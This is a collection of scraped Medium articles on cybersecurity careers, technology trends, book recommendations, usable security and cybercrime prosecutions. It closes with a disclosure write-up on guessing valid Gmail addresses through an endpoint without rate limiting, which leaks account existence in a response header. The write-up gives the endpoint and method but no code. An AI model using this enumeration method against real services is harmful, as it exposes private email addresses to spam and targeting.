Realizing how crucial security is, Houmann started attending infosec conferences. He was amazed by how much there was to learn. Being a consummate professional and a studious mind, he’s learned a lot about infosec. And he’s always learning more.
He went on to leave ImproveIT Consulting and enter cybersecurity full time by working for Peerlyst. And the rest is history.
Follow Houmann on Twitter: @ClausHoumann
Giovanni Natale (Johnny Xmas)
Hackers are natural potential infosec pros. I’m referring to hackers in the Steven Levy, Richard Stallman sense, not the colloquial, Hollywood-driven “hackers are all bad people and blackhats” sense. Having an innate curiousity about technology and experimenting with it to explore what it can do is all that it takes to make a hacker. Johnny Xmas has always had that type of mind, and he never let his circumstances dissuade him.
Johnny Xmas’ fascination with computers started early on. While working at Best Buy and without formal IT training, he was able to assemble his very first PC from parts he was able to acquire from his employer’s dumpster. He was later fired for being caught, even when police acknowledged that he did nothing illegal. It’s a crying shame how many good products retailers throw away all the time, just because they think if they gave away what couldn’t be sold it’d make consumers less likely to buy stuff. Thus is the wastefulness of Capitalism.
2600 Magazine got him into hacker culture and showed him that there are other people out there who are just like him.
While at college, Johnny Xmas used his hacker mind to expose something that was going on. He’s mum about the details for legal reasons, but he says a lack of understanding of ethical disclosure was a factor in his being expelled from the school. Oh well. As Alanis Morissette once sang, you live, you learn.
Exploring computer systems and networks, however legally or illegally, taught him the skills of a sysadmin. Unfortunately, most employers won’t hire people in that role without formal, professional experience. So with sysadmin dreams, Johnny Xmas started working at a PC repair shop. Driven by ambition, he got his CompTIA A+, Network+, and a Cisco CCNA. But that still wasn’t enough for sysadmin employers!
Curiousity led him to explore printer devices, and he also acquired vendor certifications in that area. A friend noticed his printer expertise and got him a lucrative job in repairing them. That employer was poorly managed and he was afraid of the company going out of business. So he did everything he could to make their work more efficient, including streamling their auditing process. In doing so, Johnny Xmas learned a lot about Linux, networking, and databases.
Having taught himself a lot about hacking, and having read a lot about cyberattacks, he did a great deal of security hardening which he thinks may have been overzealous in hindsight. But his employer was impressed with his knowledge and how he went above and beyond the call of duty.
His sysadmin dream came true, and eventually he was in charge of all of the IT work in a newly opened second warehouse. But then the inevitable happened. His employer’s poor managemt led to them going out of business and he was out of a job. Like when Gamergate and InfoSec Institute’s cowardly reaction temporarily haulted my infosec writing career, Johnny Xmas fell into a depression.
He joined a group who played board games once a month in order to motivate himself to leave his house. At some point, one of the group members emailed his roommate, asking him if he knew anyone with infosec skills. The group member was hiring for a Fortune 500 company.
You know where this is going. Due to his honest nature and 1337 hum0ur in his job interview, Johnny Xmas got the Security Engineer position over other candidates with more formal qualifications.
When he wasn’t engaged in assigned tasks, he got hands on experience with penetration testing and vulnerability validation. During industry events, he met someone who worked in Red Teaming (penetration testing) with a credit card company. They talked about testing, and shared knowledge with each other. At a new employer, his infosec friend was tasked with helping compile a new Red Team. Johnny Xmas was recommended, as his friend was aware that he was being laid off due to a corporate merger. Yep, he got the job.
Johnny Xmas describes his current penetration testing career as “legally robbing banks and federal agencies.” Sounds like fun!
Follow Johnny Xmas on Twitter: @J0hnnyXm4s
Cheryl Biswas (3ncr1pt3d)
Cheryl Biswas studied political science in school. Having been a political journalist before I became an infosec journalist, I envy the opportunity that she had.
Governments and elections have a crucial impact on our everyday lives. As we’ve been burdened with ever more bizarre and scary political leaders and candidates lately in North America, Europe, and the Philippines, hopefully people are appreciating that more.
But instead of becoming a political journalist, or a political worker like Kat Sweet, Biswas entered IT as a Help Desk agent. Well, there’s something else that we have in common.
But instead of working for an outsourcer for an American ISP as I did, she got a good job at Canada’s storied Canadian Pacific Railway. The company was previously known as CP Rail, and it started operations all the way back in 1881!
CPR’s IT department has an excellent reputation. Biswas said it was an excellent opportunity to learn from some of the best. Mentoring is a part of their corporate culture. She’s still in contact with some of her former colleagues to this very day.
She had to take a ten year absence from her career for motherhood. Corporations can be very judgmental of women who may need to take breaks from employment for pregnancy and childrearing. That and outrageous child care costs probably hurt society, even here in supposedly more progressive Canada.
But Biswas was fortunate. She had the communication skills, interpersonal skills, and technical knowledge that a managed service provider was looking for. They employed her part time, which helped her balance career and motherhood.
A Kaspersky newsletter was available in her workplace as Stuxnet hit in 2010. She was fascinated. Stuxnet is fascinating. It’s really complex malware. It contains a worm, a link file, and a rootkit that targets programmable logic controllers. Its development may have been the most expensive ever for malware- it would take a nation state to create. It was rumoured to have been a joint American and Israeli operation against Iran’s nuclear infrastructure. The rumour was later confirmed. Biswas researched Stuxnet and wrote a report about it for her boss, driven by curiousity.
When her company decided to start a Twitter presence, she was handed the responsibility of operating it. That helped further her exploration of infosec. She loved researching cyberwarfare, social engineering, malware, and everything connected to those areas.
Biswas loved sharing her research with her colleagues. Even though her colleagues would rather fix immediate problems than think about longterm solutions and the big picture.
But then September 2014 hearlded the first discovery of a Shellshock bug, one of many. It affects the Bash shell that’s used in many UNIX systems. Lots of internet services worldwide use the program, so the security implications of those bugs are massive. Biswas’ coworkers sought her for help. She was involved in weekly security meetings and customer advisories.
She soon worked on the corporate website, and her own security blog.
Her employer helped her attend her first infosec convention, Circle City. It was a great experience for her to learn and network. BSides Las Vegas has a program called Proving Grounds. It gives new infosec convention speakers the opportunity to be mentored. Biswas got that opportunity, and she flourished. She’s gone on to give more infosec con talks, contribute to more security blogs, and mentor others as she has been mentored.
Last year, she got a cybersecurity position with KPMG. She’s glad that she decided to pursue infosec professionally, and her CyberWatch blog is always a worthwile read.
Follow Cheryl Biswas on Twitter: @3ncr1pt3d
— -
If you enjoy my information security writing, help me buy groceries. Please support my Patreon. Thank you.
If you enjoy this article, help a non-rich cybersecurity woman out… Please click on the little green heart to recommend my article!
Hacker Noon is how hackers start their afternoons. We’re a part of the @AMI family. We are now accepting submissions and happy to discuss advertising & sponsorship opportunities.
If you enjoyed this story, we recommend reading our latest tech stories and trending tech stories. Until next time, don’t take the realities of the world for granted!
Written by
","['About', 'Help', 'Go Home', 'Cybersecurity', 'GamerGate', 'Information Security', 'Information Technology']"
7 Uses of Exponential Technology We’re Excited to Watch in 2017,https://medium.com/singularityu/7-uses-of-exponential-technology-were-excited-to-watch-in-2017-e51ec2f6bdc7?source=tag_archive---------8-----------------------,"This post was originally published on Singularity Hub. These excerpts that follow were written by Singularity Hub team members.
by Alison E. Berman
Covering technology is exhilarating.
Each year is filled with unforeseen surprises — advances we thought were years away, unexpected technology applications (like AI used for mental healthcare), and unlikely startups reimagining entire markets.
These breakthroughs keep Singularity Hub’s team of tech-enthusiasts on our toes around the clock. Though we can’t forecast like famous futurist Ray Kurzweil, many of us have a favorite technology or two that we constantly track.
Moving into the new year, these are some of the technologies we’ll be eagerly watching in 2017 and beyond.
“AI really made headlines this year. AlphaGo was on the tongue, OpenAI got a billion dollars to develop ethical AI, and toddlers talked to Google Home and Amazon Echo. (This generation won’t remember when they couldn’t converse with computers.) The first two developments are fascinating, but the third may be more immediately relevant. The idea of X product + AI will get legs next year — but it’s the surprises I’m most looking forward to.”
–Jason Dorrier, Managing Editor
Recommended reading: The AI Conversation Has Exploded This Decade With Big Advances
“Cybersecurity means a lot of things to a lot of people, and often one person’s definition is at total odds with another’s. For me, I long for the type of unbeatable encryption promised by quantum computing, because quantum computing is going to make today’s encryption worthless. It’s something of a sinister race between computing power, encryption, and political motives. Meanwhile, billions of smart gadgets are coming online, and most of us already conduct our daily lives by digital means. With governments demanding access to digital devices and histories, I fear loss of citizen privacy, but still have faith in the democratization of cybersecurity.”
–Matthew Straub, Digital Engagement Manager (the voice behind Singularity Hub’s social media)
Recommended reading: Quantum Computing Is About to Overturn Cybersecurity’s Balance of Power
“I’m most excited about the future of decentralized peer-to-peer (p2p) networks. As we’ve seen with the sharing economy, it may be all too easy for a small startup to siphon the wealth of a local community sharing resources amongst themselves. We can use technologies like blockchain, cryptocurrencies and BitTorrent to redefine value by integrating blockchain-based democratic decision making, decentralized peer-run organizations, and organizational principles from platform cooperativism. Ultimately, as this trend continues, we’ll have an opportunity to regenerate local economies with the resources already available instead of extracting value where there isn’t much to begin with.”
–Andrew J. O'Keefe II, Media Producer
Recommended reading: In the Future, Ownerless Companies Will Live on the Blockchain
“Over the last few years there have been great cases of technology used to enhance classroom learning, like VR experiences that take students inside the bloodstream or into Darwin’s lab to assemble a skeleton. This year, Zuckerberg Education Ventures invested in Volley, an AI learning assistant for students. The application provides students links to additional resources and highlights critical information when a user points their smartphone’s camera at a homework assignment or textbook page. In 2017, I’ll be watching for a new wave of AI applications focused on improving classroom learning for students with unique learning needs by providing resources like customized learning plans and personalized evaluations. Volley talks about ‘engineering for knowledge,’ and I’m hoping to see a lot more of this in the coming year.”
–Alison E. Berman, Staff Writer
Recommended reading: Put Down the Textbook: How VR Is Reimagining Classroom Education
“In November, SpaceX submitted an application to the FCC to launch over 4,000 satellites into space to envelop Earth in high-speed internet, providing connectivity to even the most remote areas of the planet. If approved, SpaceX’s plan will pose serious competition to Google’s Project Loon, which has the same mission. Besides seeing which method has more success, it will be exciting to watch the effects of increased connectivity on the global population, particularly in developing nations that have yet to solve larger challenges related to education, healthcare, and access to natural resources.”
–Vanessa Bates Ramirez, Associate Editor
Recommended reading:Meet the Rising Billion Who Will Fuel Disruption in the Global EconomyThe Race to Wrap the Earth in Internet Is Heating Up
“I have a fantasy that one day in the future, I will be able to design, create and grow different types of biological products at home — anything from perfumes and medicine to cool materials like mushroom leather. The day when anyone can have an easy-to-use biological manufacturing facility at home is still a ways off, but the first step to that future is having something like the Amino Lab to learn bioengineering and start small, like making bacteria that grows.”
–Sveta McShane, Production Manager
Recommended reading: Why We Should Teach Kids to Code Biology, Not Just Software
In 2017, we will truly begin to see the coming disruption self-driving vehicles will have on our society and future. Open source machine learning agents, more advanced algorithms, and better hardware technologies are bringing this autonomous reality closer. Tesla has already said vehicles now being produced have the hardware for level 5 autonomy capabilities (no need for steering wheel or brakes). Down the road, when the algorithm is ready, Tesla may make these cars autonomous with a software update.
–Kirk Nankivell, Web Production Editor
� For more from the Singularity Hub team, get their newsletter
Written by
","['SU', 'Grand Challenges', 'Community', 'Abundance', 'Singularity Hub', '2017', 'Community', 'Exponential Technology', 'Artificial Intelligence', 'Cybersecurity']"
8 cyber security professionals share their essential reads,https://medium.com/threat-intel/essential-cybersecurity-books-32ce92c24c47?source=tag_archive---------0-----------------------,"Welcome to Threat Intel’s #WednesdayWisdom column, which aims to help improve your cybersecurity knowledge and keep you informed on important developments.
There are many sources of information for those working in, or hoping to work in, the world of cyber security. Technical blogs, online courses, podcasts, webcasts, and more provide a wealth of information on the latest happenings in the threat landscape.
However, sometimes you can’t beat a good book, so in the run-up to World Book Day, which takes place on Sunday, April 23, we asked a range of Symantec experts for their essential reads for cyber security professionals (or those looking to get into the industry), as well as any other personal favorites.
The recommendations of Eric Chien, distinguished engineer and technical director in Symantec Security Response, ranged from practical guides for those in the industry, to some cracking tales of cybercrime.
Unsurprisingly, given Eric was one of the lead researchers involved in Symantec’s investigation into the infamous Stuxnet threat, even featuring in Alex Gibney’s Zero Days documentary on the subject, one of his recommendations is a book looking at the background of that digital weapon.
· Cryptonomicon; Neal Stephenson: A work of fiction that jumps from the 1940s to the present day that features cryptographers and hackers, and hints at a dark future.
· Cuckoo’s Egg; Clifford Stoll: Stoll’s memoir about his quest to capture a cyber spy.
· Countdown to Zero Day: Stuxnet and the Launch of the World’s First Digital Weapon; Kim Zetter: Cyber security journalist Zetter tells the story behind Stuxnet.
· Kingpin: How One Hacker Took Over the Billion-Dollar Cybercrime Underground; Kevin Poulsen: Ex-hacker and journalist Poulsen recounts his tale of the pursuit of an infamous cybercriminal.
· The Art of Computer Virus Research and Defense; Peter Szor: One of the lead researchers behind Norton AntiVirus, Szor takes readers behind the scenes of antivirus research.
· Windows Internals, Part 1 (Developer Reference) 6th Edition; Mark E Russinovich, David A Solomon, Alex Ionescu: A guide to Windows architecture and internals.
· Applied Cryptography: Protocols, Algorithms, and Source Code in C; Bruce Schneier: An essential introduction to cryptography.
· The Practice of Network Security Monitoring: Understanding Incident Detection and Response; Richard Bejtlich: This book details how Network Security Monitoring can help protect networks and data.
Ireland-based threat analysis engineer Jennifer is currently busy preparing for Symantec’s Cyber War Games final, which will take place in May.
While Jennifer admits she tends to read technical blog posts about particular subjects, there are some practical books she continues to turn to as well.
· Practical Malware Analysis: The Hands-On Guide to Dissecting Malicious Software; Michael Sikorski, Andrew Honig: An excellent handbook for starting out with malware analysis.
· The Web Application Hacker’s Handbook: Finding and Exploiting Security Flaws; Dafydd Stuttard; Marcus Pinto: A guide to web application penetration testing.
· The Hacker Playbook 2: Practical Guide To Penetration Testing; Peter Kim: A step-by-step guide to the “game” of penetration hacking.
Principal technical support engineer and avid reader Mick Halpin recommended an array of books covering a variety of different areas.
· Spam Nation: The Inside Story of Organized Cybercrime — from Global Epidemic to Your Front Door; Brian Krebs: Awesome investigation into where this stuff comes from and who makes their money from it.
· Fatal System Error: The Hunt for the New Crime Lords Who Are Bringing Down the Internet; Joseph Menn: Pretty old now but a worthy read that delves into the murky world of cyber crime.
· DarkMarket: How Hackers Became the New Mafia; Misha Glenny: Mick used one word to describe this book, which details the fight back against malicious hackers: awesome.
· McMafia: A Journey Through the Global Criminal Underworld; Misha Glenny: Also by Glenny, this book sees the veteran journalist travel across five continents to speak with people at every level of the criminal cyber underworld.
· The Hacking Exposed series contains detailed advice and strategies to help defeat cyber criminals.
· Cyber War: The Next Threat to National Security and What to Do About It; Richard A. Clarke, Robert Knake: Former presidential adviser and counter-terrorism expert Clarke details the threat the US faces from cyber crime.
· Universal Scams & Fraud Detection; David Snow: This book focuses mainly on the many billions lost to insurance fraud but also features information on computer-related scams.
· The Florentine Deception; Carey Nachenberg: A work of fiction by a Symantec alumnus, this is a bit Dan Brown, and a fun adventure that exposes some dangers inherent to computers.
· Dark Times in the City; Gene Kerrigan: A recommendation that’s unrelated to tech, this is a crime novel by Irish journalist Kerrigan.
A principal software engineer and analyst in Symantec Security Response, Gavin has been involved in many investigations into cyber criminals’ tactics and behaviors.
While admitting that he now finds a lot of the information he needs online, he recommended some books he has turned to over the years.
· The Hacker Crackdown; Bruce Sterling: A nice summary of the hacking landscape in the 1980s and 1990s.
· Rise of the Machines: The Lost History of Cybernetics; Thomas Rid: Pulling together the history of cybernetics, this book also has some details about the first publicized international espionage hacking.
· Confront and Conceal: Obama’s Secret Wars and Surprising Use of American Power; David E Sanger: A wide-ranging book, it contains details about Stuxnet, and Operation Olympic Games.
· Ready Player One: A Novel; Ernest Cline: A fiction recommendation, this is a fun book for anyone with an interest in computers who grew up in the 1980s.
· Network Security Assessment: Know Your Network; Chris McNab: A guide to performing network-based penetration testing.
· Computer Networks; Andrew Tanenbaum, David Wetherall; An introduction to networking, explaining how networks work from the inside out.
· Gavin also recommends the Hacking Exposed series, which was also recommended above.
Liam, a director of development in the Symantec Security Response team, was one of the lead researchers involved in Symantec’s investigation into Stuxnet. He, together with Eric Chien, is now considered one of the authorities on this subject, and also featured in Alex Gibney’s Zero Days documentary.
Given how closely they have worked together, it is perhaps unsurprising that there was some overlap with Eric’s and Liam’s recommendations, Liam also recommended Cuckoo’s Egg, Countdown to Zero Day: Stuxnet and the Launch of the World’s First Digital Weapon, and Kingpin: How One Hacker Took Over the Billion-Dollar Cybercrime Underground.
· Exploding the Phone; Phil Lapsley: This book tells the story of the people who, long before the internet, discovered how to hack the telephone.
· Ghost In The Wires: My Adventures as the World’s Most Wanted Hacker; Kevin Mitnick, William Simon: Mitnick recounts his experiences as the “world’s most wanted hacker”.
· The Code Book: The Secret History of Codes and Code-breaking; Simon Singh: A look at the history of man’s urge to uncover the secrets of codes.
· Fallout: The True Story Of The CIA’s Secret War On Nuclear Trafficking; Catherine Collins, Douglas Frantz: This book examines the circumstances that led to nuclear weapons technology spreading throughout the world.
· Wiring Up The Big Brother Machine… And Fighting It; Mark Klein: Whistleblower Klein recounts the impact of revealing that illegal government spying apparatus had been installed at an AT&T office by the NSA.
· Fatal System Error: The Hunt for the New Crime Lords Who Are Bringing Down the Internet; Joseph Menn: This book was also recommended by Mick Halpin.
· Malware Analyst’s Cookbook and DVD: Tools and Techniques for Fighting Malicious Code; Michael Ligh, Steven Adair, Blake Hartstein, Matthew Richard: A computer forensics “how-to” for fighting malicious code and analyzing incidents.
· The IDA Pro Book: The Unofficial Guide to the World’s Most Popular Disassembler; Chris Eagle: An essential read for those analyzing malware, conducting vulnerability research, or reverse engineering software.
· Liam also recommends Practical Malware Analysis: The Hands-On Guide to Dissecting Malicious Software, which is also recommended above.
Aleatha, a senior principal research engineer based in California, had some words of wisdom about what she thinks it takes to be a good cyber security professional.
“It’s important to know how exploits happen and how the bad guys think. You also need to know what tools are at your disposal to help protect users.”
“My bookshelf is a mix of hacking guides and crypto. You also need to understand modern operating systems and software architecture to understand how a lot of vulnerabilities occur, so it’s good to have a really solid OS book. I have the Tanenbaum OS book (Modern Operating Systems: Global Edition), like everyone else. It’s Unix-centric, but it’ll teach you about things like heaps, stacks, and context switches, which are applicable to all OSes. And [to be a good cyber security professional] you should have some experience in a low-level language like C, so you understand things like pointers and memory layout.”
· Smashing the Stack for Fun and Profit; Aleph One: It’s a little dated, but this short pamphlet gives a great intro to the one of the most basic classes of security exploit, while explaining the OS fundamentals around it. If you are wondering how malware works, start here.
· The Shellcoder’s Handbook: Discovering and Exploiting Security Holes; Chris Anley; John Heasman; Felix Lindner; Gerardo Richarte: This is a really detailed guide to the theory and practice of finding and exploiting security holes. It doesn’t focus on hacking tools, as many other books do, instead focusing on the nitty gritty of hacking: how to smash stacks; how to exploit buffer overflows; how to return into libraries. It’s not for the amateur, it assumes you have a good knowledge of how software and operating systems work, but it’s got incredible depth. Another good one in this vein is Hacking: The Art of Exploitation (Jon Erickson).
· The IDA Pro Book: The Unofficial Guide to the World’s Most Popular Disassembler; Chris Eagle (as recommended above): Will teach you how to reverse engineer code. It’s useful for analysts, as well as for understanding how hackers find vulnerabilities.
· Applied Cryptography: Protocols, Algorithms, and Source Code in C; Bruce Schneier (as recommended above): It’s a good idea to rely on well-vetted crypto libraries wherever possible, know how to use them right, and what the pitfalls are. Schneier is one of the best writers on this subject. I also follow his blog, which is great for keeping up with recent exploits and developments in security.
A senior director of engineering and “cyber security czar” at Symantec, Tarah is also a well-known speaker on the tech conference circuit, an author, and a prolific tweeter.
She had three recommendations to make for what she thought were the most relevant reads for those in the field of cyber security.
· Theory of Games and Economic Behavior; John von Neumann, Oskar Morgenstern: First published by Princeton University Press in 1944, this book was a groundbreaking text upon which modern-day game theory is based.
· Judgment Under Uncertainty: Heuristics and Biases; Daniel Kahneman, Paul Slovic, Amos Tversky: This book brings together a range of academic papers to study the factors that influence human decision making.
· Threat Modeling: Designing for Security; Adam Shostack: This book details how to build better security into the design of systems, software, and services.
Candid, a principal threat researcher in Symantec Security Response, says that a lot of his information these days comes from white papers and articles, while also underlining that cyber security is a broad field with different skills required in different areas.
“Reverse engineering or forensics might apply to one person, whereas others can use more information on web application security and python scripting.”
Three of Candid’s recommendations have already been mentioned:
· The Art of Computer Virus Research and Defense
· Practical Malware Analysis: The Hands-On Guide to Dissecting Malicious Software
· Hacking: The Art of Exploitation: Candid describes this as a good start for those who want to learn about buffer overflows and other exploits.
Candid also recommends:
· The Tangled Web: A Guide to Securing Modern Web Applications; Michal Zalewski: This is a good start for those wanting to learn about web application security.
Check out the Security Response blog and follow Threat Intel on Twitter to keep up-to-date with the latest happenings in the world of threat intelligence and cyber security.
Like this story? Recommend it by hitting the heart button so others on Medium see it, and follow Threat Intel on Medium for more great content.
Written by
","['KNOWLEDGE', 'CAREERS', 'HISTORY OF...', 'DEEP DIVES', 'ARCHIVE', 'SYMANTEC BLOG', 'Cybersecurity', 'Tech', 'Technology', 'Infosec', 'Knowledge']"
About Usable Security - Nicolas Papernot - Medium,https://medium.com/@NicolasPapernot/about-usable-security-bb006cfbfda3?source=tag_archive---------6-----------------------,"Here are a few notes I jotted down during talks by Adrienne Porter Felt, Jon Oberheide, and Matthew Smith on the topic of usable security. These talks were part of Enigma, a conference launched this year by USENIX.
A good security feature should be invisible when you don’t need it and helpful when you need it. Unfortunately, this is really hard to do. For instance, HTTPS certificate validation errors are hard to understand for end users. This lack of usability makes the fight against phishing attacks harder.
“Usable security is a science.” When working on usable security, researchers and engineers should be defining controls, hypothesis, and test them. In no case should they trust their gut or common wisdom.
To convince yourself of the importance of a scientific approach when it comes to usable security, here are a few example scenarios encountered by the Chrome team at Google.
Example 1: browser notifications
Very rich APIs are coming to the web after being prominent in the mobile app ecosystem. As a consequence, user notification systems that were only available to mobile applications until recently are now available to websites as well. Many concerns can be raised about the implementation of notifications in browsers: they might be spammy, could be used for phishing, or even simply be confusing to users (since they are not used to have websites interact with them once they close the respective tab in their browser). Thus, when implementing notifications in the browser, careful care must be taken to avoid annoyance to users. A rigorous study performed by the Chrome team confirmed the following hypothesis:
Attention and acceptance rate to notifications drops dramatically after several prior requests.
Example 2: safe browsing
Safe browsing is the feature that tells Chrome when a website is malicious — it also exists in other browsers. The warning tries to convince users not to proceed to the website. Here again, Google wanted to test a few ways to display the warning so as to increase user reaction of going back to security. The difficulty here lies in needing to provide a message both brief and specific about the risk. Here, the Google team ran a series of A/B tests with various warning messages to measure the difference between a simple informative message (e.g., This file is malicious) and an informative message along with a command (e.g., This file is malicious. To stay safe, don’t run it). The results showed that adding the command did not make any difference. Intuitively, we could reasonably have hypothesized that adding the command would lead more people to go back to safety. This counter intuitive result shows the importance of not listening to one’s gut when working on usability security. Indeed, security experts are strongly biased and are not representative of the general pool of users. Conducting such a scientific experiment has a cost but avoids rolling out a security feature that would not have worked. The following paper provides more details.
Example 3: internationalization
Most studies performed in academia are ran on American English speaking young individuals(often from college towns…). Indeed, it is easier to run a study with people available around you. However, this leads to a strong lack of available literature evaluating the different behaviors with respect to security in different cultures. As an example, HTTP error appearance rates vary by country. Another example: Japanese users were found to not be responding to Chrome warnings as well as users from other countries.
To conclude, this talk emphasized the need to consider usable security as a science: security researchers and engineers should do great science and share it with everyone. Even for industry, there is merit in taking a scientific approach (e.g., it avoids launching useless features). For academia, this a research topic very useful to industry with lots of direct applications.
The impact of authentication breaches is important. Some of the largest examples include Target (direct impact on 40M consumer credit cards), Adobe (indirect impact on 153M end user credentials), Juniper (meta impact on thousands of organisations). Security is improving thanks to patches, regular updates, and bug bounties. However, breaches are increasingly more complex and devastating. There is no single point of failure in security but this talk puts an emphasis on the intersection between security and usability.
The security industry and usability
The security industry ($88B) promotes complexity and sophistication over simplicity and usability. As a result, complexity is perceived as more effective by users.
This is due to aggressive visuals and terminology staging a militarization of security. Oberheide argues that there are no battles or front lines and that the security industry should instead focus on making security products easy to use for users to promote wider adoption. To avoid complexity, security solutions should avoid praising defensive depth: line ups of multiple solutions to reduce the probability of an attacker going passed all layers of security. This leads to complex and expensive solutions that do not scale.
Oberheide argues that these simple measures can mitigate many attacks:
Organizations and usable security
Security experts need to continue advocating fundamentals of security outside of their industry.
The FTC’s “Start with security” program has some of the most sane guidelines for organizations to embrace security.
Because architecture evolved from mainframes, to clients/servers, and finally to cloud/mobile, lots of security controls that used to be deployed are not relevant anymore. Oberheide argues we need to follow the same end-to-end idea than with the Internet’s architecture: move security to edges.
Usable security and end-users
Interaction of security solutions with users is often negative. This creates a negative mindset regarding security. One good practice highlighted during the talk is from Slack. They created an anomaly detection department. When an anomaly is detected, they directly contact the end user who created the anomaly to verify the action was intended. Getting feedback from the users is very important when designing and implementing security solutions.
Does usable security have an indirect impact on security posture within an organization? Are happy users less susceptible to social engineering attacks?
Oberheide is convinced we should promote safety instead of security. Security solutions should make it easier to exhibit safe behaviors instead of implementing security restrictions.
An example of usable security: 2-factor authentication
2-factor authentication is typically performed using hardware tokens. However tokens are expensive and provide a poor user experience. Alternatives include phone calls and sms but both rely on insecure cell carrier channels. Software tokens are hard to use because of the countdown timer. This explains the current rise of 2-factor authentication through push notifications. Users can easily confirm authentications requests using their phone. The technology provides strong transport security and asymmetric cryptography. Will 2FA authentication one day replace passwords?
Matthew Smith cited this quote from Angela Saase:
Users Are Not the Enemy
and extended it with the following quote:
Developers are not the enemy either.
To motivate the importance of implicating developers (anyone involved in the technical side of a product) in the security process, Smith gave an example. In 2013, a study showed that 610 000 bad certificates out of 4.5M unique certificates showed errors on end-user browsers. Most of these certificates were installed by administrators on systems used by end users.
To show the impact of implicating developers in the design of security solutions. Smith mentioned that his team worked with 15 developers to understand how to secure HTTPS on Android. These discussions gave them enough information to develop a framework valid for over 13,000 apps.
Another example of why developing tools usable for developers is useful was given for malware detection. Typically, information recovered from malware analysis is very lossy. Smith’s team improved a decompiler and showed that it multiplied the malware detection rate of students by 3 and of malware experts by 1.5. The resulting decompiler, DREAM++, will be released soon.
Smith insisted on the importance of getting in touch with security researchers and system developers to figure out which security solution is more usable. Indeed, problems solved for security researchers and system developers do not have been to be faced by end users.
Please leave any comments you may have below or reach out to me on Twitter at https://twitter.com/NicolasPapernot
Written by
","['Security', 'Cybersecurity', 'Usability']"
Absurd Cases of Cyber Crime - Commit Log - Medium,https://medium.com/commitlog/the-absurdity-of-cyber-laws-f6676ba8a7d6?source=tag_archive---------7-----------------------,"Recently a story broke about a 13 year old female student from Japan being charged for publishing a web page that ran a script which showed an alert message in an infinite loop which looked like this.
Frankly, It’s as ridiculous as it gets and at first I figured there was something lost in translation between the original source and Ars Technica’s take on the story but others have been reporting the same story so under the assumption that it’s true I just have to say it’s a truly bizarre case.
Basically the “malicious” code in question boils down to a single line of JavaScript code being hosted on their own webpage.
Nothing malicious happens when you run it, at best it’s a mild nuisance. Most browsers will actually present a checkbox as seen in the screenshot above which will prevent further messages from popping up once checked and hey at the end of the day one could always close the browser tab.
The whole case is just bizarre, heck if anything this girl could be a rock star developer in Silicon Valley, she’s following the principles of modern web development to the letter, pop-ups and modal dialogs all the way.
Which brings me to this other story that broke back in 2018 where a young Canadian was charged for downloading files publicly available from Nova Scotia’s freedom-of-information portal.
The teen has been charged with “unauthorized use of a computer,” which carries a possible 10-year prison sentence, for downloading approximately 7,000 freedom-of-information releases.
Yes, you read that right, for downloading freely available documents from a freedom-of-information portal.
Basically what happened was that the site had all the files which they ater claimed were not for public consumption, publicly available on their server where each file was named in a sequence.
Imagine the file was at https://supersecret.com/secret-file-1.pdf and all you had to do was change the digit in the file number to get at the next file. Well that’s basically what he did, he had a knack for scraping and archiving things on the web which, if you ask me there’s nothing wrong with.
Again, another really bizarre case, and the irony isn’t lost on the that it’s a freedom-of-information portal. It’s like being charged for picking the secret book in the public library, the one next to all the other books which you are allowed to read, but that one book that looks like all the others was a no-no.
If the files really are that sensitive, that makes it a severe case of negligence on their part but hey lets not focus on that.
And finally there’s the case of the kid that got arrested for reporting a bug around two years ago. Basically the Budapest Transport Authority wrote their online payment system to be a piece of junk with no server side validation of their prices. So the “hacker” was fiddling around in the browser’s developer tools and changed the prices on the page which let him buy tickets for cheap (anyone with even a moderate knowledge of how a web works could do this). He then reported his findings to them which, drumroll guess what? It got him arrested.
On or about July 14 an unnamed 18-year-old — “The boy is nobody. He’s not even a programmer,” said one Hungarian who wished to remain anonymous — emailed BKK about a hole he found in their system. The hole, if it can be called that, let anyone with passing knowledge of modern browsers to set any price they wanted for any ticket in the system. By simply pressing F12 a “hacker” could change the price of a ticket right in the browser, and because there were no server checks, they could purchase the ticket at that price. The 18-year-old “hacker” discovered this and showed BKK that he was able to buy a monthly ticket. “A monthly pass costs 9500HUF (about 30EUR) and he modified the price to 50HUF,” wrote Laszlo Marai in his post on the attack.
Yay for doing the right thing huh? This one is arguably slightly more malicious but he did disclose it. I guess the moral of the story is that it never pays to do the right thing, never go full white-hat.
Also, look away! It’s not like anyone was negligent here it’s the users fault for looking behind the curtain.
One thing all of these cases have in common is that, in my opinion they should never even have been a thing, I’d think most people will agree with this especially fellow programmers and technically able people who understand what’s going on.
Speculating here but It almost seems like someone who had very little idea on how the technology works at all was deciding on how to take action. While there has been no conviction in any of these cases as far as I could find it’s still fairly damaging to one’s reputation to have 15 cops bust down your door for trying to report a bug and do the right thing.
He might have gone about it the wrong way but then again it’s an 18 year old kid. Personally I don’t even bother to report bugs any-more. Going through the right channels and disclosing a bug “responsibly” to a company is quite an annoying and time consuming undertaking. Cases like these don’t exactly make me eager to pay attention to any bugs either when the person finding the issue is the one ends up being blamed for a company’s blatant fuck-ups like in the case of the Budapest Transport Authority.
Written by
","['Archive', 'JavaScript', 'Technology', 'Programming', 'Cybersecurity']"
Abusing Gmail to get previously unlisted e-mail addresses,https://blog.0day.rocks/abusing-gmail-to-get-previously-unlisted-e-mail-addresses-41544b62b2?source=tag_archive---------1-----------------------,"tl;dr: I discovered a glitch that allowed me to guess, in large number, existing Google accounts addresses that could otherwise be unknown.DISCLAIMER: it’s just bruteforce that wasn’t properly rate-limited, nothing too fancy, so if you’re looking for some juicy 0day please pass along �
The non rate-limited URL is https://mail.google.com/mail/gxlu. I noticed that providing an non existant user/e-mail will trigger a different header response from the server. For example here with a valid account you’ll get:
And with a non existant account:
The two requests will show equivalent HTTP 204 No Content replies but a request against an existing account the server shall add a Set-Cookie header.
So obviously I decided to write a Python script to abuse this… �
The main idea was to lookup for firstname.lastname@gmail.com addresses that are likely to exist. First step: getting a list of known firstnames and lastnames. Thanks to Facebook and a 2010 information leak such lists are publicly available. Another idea was to generate fake personas using randomuser.me and check if they can match existing accounts.
This way I was able to guess around 40,000 valid e-mail addresses per day with a stupid unoptimized PoC.
The issue here is that a large part of these addresses are unknown to the public. People might want to get their privacy respected and not being spammed by bots, right?Bruteforcing can be limited easily: captcha, rate-limiting, etc. You already get these protections on most of the Google services, take an example of Google over Tor, there are captchas everywhere!
I checked using the haveibeenpwned.com API for pwned addresses. The idea was to get the probability for a random and valid e-mail address to be in some kind of leaked database. Interestingly it is not that likely!
